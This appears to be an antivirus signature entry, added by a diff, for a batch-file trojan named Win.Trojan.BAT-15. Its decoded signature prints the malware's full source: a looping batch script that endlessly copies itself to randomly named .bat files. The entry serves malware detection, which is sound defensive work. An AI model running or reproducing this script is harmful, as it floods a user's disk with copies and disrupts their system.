@@ -1,0 +1,13 @@
+VIRUS NAME: Win.Trojan.BAT-15
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+
+ReM Trojan.BatXP.CopyMe.b
+ReM by Second Part To Hell
+:cpym
+call copyme
+goto cpym
+copyme:
+copy %0 %random%.bat
+exit
